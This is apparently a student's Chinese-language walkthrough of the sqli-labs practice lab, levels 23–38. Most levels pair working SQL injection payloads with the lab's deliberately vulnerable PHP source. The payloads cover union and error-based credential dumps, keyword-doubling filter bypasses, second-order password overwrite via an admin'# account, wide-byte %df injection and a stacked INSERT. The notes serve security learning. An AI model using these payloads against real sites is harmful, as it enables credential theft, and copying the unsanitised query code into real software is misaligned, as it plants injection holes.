## Sql-labs Page-2

### Less-23

**这一关是一个GET类型的，我们尝试输入==?id=1==界面发生了回显，然后改变id值内容发生了改变。接着加上单引号或者双引号，之类的。我们发现，插入单引号，界面会报错。我们接着输入注释符，发现仍然报错。猜测是代码将注释符注释掉了，发现确实注释掉了。我们接着输入 ==?id=1' or '1'='1==发现界面显示正常，后面的操作就与第一关操作类似了我。查字段名之类的。**

```mysql
?id=1' or '1'='1
 
这样sql语句就变成 id='1' or '1'='1'
 
 
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1
 
 
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1
 
 
?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1
```



#### 源码部分：

##### index源码

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];

//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo '<font color= "#0000ff">';	
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

### Less-24

我们进入界面，发现界面是一个登录框，而且还有注册和修改选项。我们猜测管理员账号名是==admin==但是我们不知道，密码。我们就首先注册一个账号，账号名为==admin'#==然后退出,然后我们登录账号，会提示我们修改密码，我们输入账号密码和要修改的密码，我们在登录界面发现，我们输入账号admin和修改后的密码发现确实可以登录了，我们再去数据库端查询，发现修改的确实是admin账号密码。

![image-20221029192025531](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221029192025531.png)



达到了修改账号密码的目的。

#### 源码部分

##### index源码

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");
?>
```



##### failed源码

```php
<?PHP
session_start();
if (!isset($_COOKIE["Auth"]))
{
	if (!isset($_SESSION["username"])) 
	{
   		header('Location: index.php');
	}
	header(': index.php');
}
?>
```

##### Logged-in源码

```php
<?PHP
session_start();
if (!isset($_COOKIE["Auth"]))
{
	if (!isset($_SESSION["username"])) 
	{
   		header('Location: index.php');
	}
	header('Location: index.php');
}
?>
```

##### login-create部分

```php
<?PHP
session_start();
?>
```

##### login部分

```php
<?PHP

session_start();
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");




function sqllogin($con1){

   $username = mysqli_real_escape_string($con1, $_POST["login_user"]);
   $password = mysqli_real_escape_string($con1, $_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";
   $res = mysqli_query($con1, $sql) or die('You tried to be real smart, Try harder!!!! :( ');
   $row = mysqli_fetch_row($res);
	//print_r($row) ;
   if ($row[1]) {
	return $row[1];
   } else {
	return 0;
   }

}






$login = sqllogin($con1);
if (!$login== 0) 
{
	$_SESSION["username"] = $login;
	setcookie("Auth", 1, time()+3600);  /* expire in 15 Minutes */
	header('Location: logged-in.php');
} 
else
{
	?>
	<tr><td colspan="2" style="text-align:center;"><br/><p style="color:#FF0000;">
	<center>
	<img src="../images/slap1.jpg">
	</center>
	</p></td></tr>
	<?PHP
} 
?>

```

##### new_user部分

```php
<?php
include '../sql-connections/sqli-connect.php' ;
?>
```

##### pass-change部分

```php
<?PHP
session_start();
if (!isset($_COOKIE["Auth"]))
{
	if (!isset($_SESSION["username"])) 
	{
   		header('Location: index.php');
	}
	header('Location: index.php');
}
?>
<div align="right">
<a style="font-size:.8em;color:#FFFF00" href='index.php'><img src="../images/Home.png" height='45'; width='45'></br>HOME</a>
</div>
<?php

//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");



if (isset($_POST['submit']))
{
	
	
	# Validating the user input........
	$username= $_SESSION["username"];
	$curr_pass= mysqli_real_escape_string($con1, $_POST['current_password']);
	$pass= mysqli_real_escape_string($con1, $_POST['password']);
	$re_pass= mysqli_real_escape_string($con1, $_POST['re_password']);
	
	if($pass==$re_pass)
	{	
		$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
		$res = mysqli_query($con1, $sql) or die('You tried to be smart, Try harder!!!! :( ');
		$row = mysqli_affected_rows($con1);
		echo '<font size="3" color="#FFFF00">';
		echo '<center>';
		if($row==1)
		{
			echo "Password successfully updated";
	
		}
		else
		{
			header('Location: failed.php');
			//echo 'You tried to be smart, Try harder!!!! :( ';
		}
	}
	else
	{
		echo '<font size="5" color="#FFFF00"><center>';
		echo "Make sure New Password and Retype Password fields have same value";
		header('refresh:2, url=index.php');
	}
}
?>
<?php
if(isset($_POST['submit1']))
{
	session_destroy();
	setcookie('Auth', 1 , time()-3600);
	header ('Location: index.php');
}
?>
```

### Less-25

我们进入关卡中，发现这一次是一个GET类型，我们尝试对ID进行传值操作，发现页面正常并出现了回显，我们接着在界面输入单引号或者双引号之类的，发现输入 单引号会出现报错，接着我们才进行字段名长度操作，发现输入 ==order by==后，在下面的蓝色语句，会将==or==过滤掉，然后我们输入==oorr==发现界面达到了预想的结果。接着我们进行下面的查询操作，中途的 ==or==被过滤的问题，只会被过滤一次。像前面的方式进行处理就可以了。

```mysql
?id=-2' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
```

总体与前几关类似，只是出现了被过滤的问题。

#### 源码

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-25 Trick with OR & AND</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");


// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		print_r(mysqli_error($con1));
		echo "</font>";  
	}
}
else 
{ 
	echo "Please input the ID as parameter with numeric value";
}

//过滤操作
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	
	return $id;
}


?>
</font> </div></br></br></br><center>
<img src="../images/Less-25.jpg" />
</br>
</br>
</br>
<img src="../images/Less-25-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
</font> 
</center>
</body>
</html>
```

### Less-26

这一关中，我们发现后台将==注释符和空格==被过滤掉了，我们可以采用==括号==进行绕过，我们可以采用报错注入的方式进行注入。

**语句示例**

```php
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0   爆表
 
 
 
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security'aandnd(table_name='users')))),1))||'0     爆字段
 
 
 
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||'0   爆密码账户
```

#### 源码部分

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-26 Trick with comments</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		print_r(mysqli_error($con1));
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}



?>
</font> </div></br></br></br><center>
<img src="../images/Less-26.jpg" />
</br>
</br>
</br>
<img src="../images/Less-26-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
</font> 
</center>
</body>
</html>

```

### Less-26a

这一关的情况和和前面的情况类似，但是这一关没有报错信息，所以不可以使用报错注入。我们可以使用==联合查询加盲注==的方法，这里就不列出来了，翻==Page-1==的部分可以解决问题。

#### 源码部分

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-26a Trick with comments</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		//print_r(mysqli_error($con1));
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}



?>
</font> </div></br></br></br><center>
<img src="../images/Less-26-a.jpg" />
</br>
</br>
</br>
<img src="../images/Less-26a-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
</font> 
</center>
</body>
</html>
```

### Less-27

这一关与26关类似，都是将空格符与注释符过滤掉了，不同的是26关中还有and 和or 被过滤了。27关的是==union和====select==被过滤掉了。 但是仍然可以显示报错信息，我们可以进行报错注入。

对于==select==和==union==被过滤的问题，我们依然可以通过下方蓝色的字体为依据进行绕过。

#### sql语句操作

```mysql
?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1))or'0  爆表
 
?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema='security'and(table_name='users')))),1))or'0  爆字段
 
 
?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or'0  爆密码账户
```

#### 源码部分

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		print_r(mysqli_error($con1));
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out select
return $id;
}



?>
</font> </div></br></br></br><center>
<img src="../images/Less-27.jpg" />
</br>
</br>
</br>
<img src="../images/Less-27-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
```

### Less-27a

在这一关中，我们发现是双引号报错，但是不会显示报错信息，所以不可以使用报错注入，我们可以使用，联合查询加盲注的方式。过滤的条件与27关中是一样的。

#### 部分sql语句

```mysql
?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema='security'%0Aand%0Atable_name='users'%0Aand"1

?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(password,id,username)from%0Ausers%0Awhere%0Aid=3%0Aand"1
```

#### 源码部分

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;
	$id = '"' .$id. '"';

// connectivity 
	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		//print_r(mysqli_error($con1));
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out Select
return $id;
}



?>
</font> </div></br></br></br><center>
<img src="../images/Less-27a.jpg" />
</br>
</br>
</br>
<img src="../images/Less-27a-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
```

### Less-28

这一关中我们首先发现是GET注入且过滤了注释符和空格符输入单引号报错，那么就是字符型注入。我们前后输入引号发现可以，正常显示。

推荐博客

[](https://blog.csdn.net/qq_53079406/article/details/125773579?)

##### 部分SQL语句

```java
?id=1')%26%26extractvalue(1, concat(0x7e, database()))%26%26('1
    
?id=0')uniunion%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'and ('1

    
```

##### 源码分析

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-28 Trick with SELECT & UNION</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		//print_r(mysqli_error($con1));
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
$id= preg_replace('/[--]/',"", $id);				//Strip out --.
$id= preg_replace('/[#]/',"", $id);					//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
return $id;
}



?>
</font> </div></br></br></br><center>
<img src="../images/Less-28.jpg" />
</br>
</br>
</br>
<img src="../images/Less-28-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
</font> 
</center>
</body>
</html>
```

### Less-28a

这一关与前一关类似

**')字符型注入**

**过滤了union、select、注释、斜杠**

**还比第28少了空格等**

这里留下去自己思考就不贴sql语句了

##### 源码部分

```java
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-28a Trick with SELECT & UNION</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		//print_r(mysqli_error($con1));
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
//$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
//$id= preg_replace('/[--]/',"", $id);				//Strip out --.
//$id= preg_replace('/[#]/',"", $id);					//Strip out #.
//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out spaces.
return $id;
}



?>
</font> </div></br></br></br><center>
<img src="../images/Less-28a.jpg" />
</br>
</br>
</br>
<img src="../images/Less-28a-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
</font> 
</center>
</body>
</html>
```

### Less-29

这一关我们进去后发现有 waf，想到可能与防火墙有关，我们先不管这个，进行前面的常规操作，发现什么都没有进行处理，这就把我搞 得很懵逼，我就去查资料。看到好像是还要搭什么环境。我先去搭一下，搭好了再来做这道题

### Less-30



### Less-31



### Less-32

这一关我们进来看到是一个叫我们输入id，现在我们开始输入id。然后在id后面加入，单引号。发现会有一条斜杠将其过滤掉，输入双引号也是一样。我们去查看源码，发现是gbk编码格式，我们可以考虑宽字节注入。不会的可以自己去百度。。。。

![image-20221117174547286](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221117174547286.png)

在这里就不细说了、

大致就是在原来的基础加上==%df==

### Less-33

妈的，这一关和上一关。一样的。我还以为是我哪里又出问题了。。。

### Less-34

这一关是post＋宽字节注入注入。方法的话，就用burp抓包，然后发送到==repeater==模块，再在那上面进行注入就可以了。注入语句与前面两关差距不大。

部分截图

![image-20221117180409334](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221117180409334.png)

### Less-35

这一关与==page-1==和第二关很像。类似。注意在爆字段名的时候。由于id没有加引号。但是表名有引号。将表名转换为16进制就可以了。

```
http://127.0.0.12/sqli-labs-master/Less-35/?id=-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273--+
```

### Less-36

这一关的解题手法和32关一样。使用的函数有区别。

### Less-37

这一关和34关一样的，还是用 burp抓包。最后在进行注入就可以了

![image-20221117182538734](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221117182538734.png)



### Less-38

这一关就是还是简单的单引号闭合套路，过关的手法的话，和==page-1==前面的几关差不多。但是阅读源码我们会发现这一次有了==mysqli_multi_query函数==那么我们就可以使用==堆叠注入==这种注入手法前面没有提到过。使用的场景也相对较少。检测堆叠注入是否成功了，我们可以使用==insert==语句添加一段数据，然后查询。

```sql
?id=1';insert into users(id,username,password) values (50,'Nige','Nige')--+
```

然后我们在==id==后面将数据改为50查询

![image-20221117183654704](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20221117183654704.png)

注入成功。。。







































































































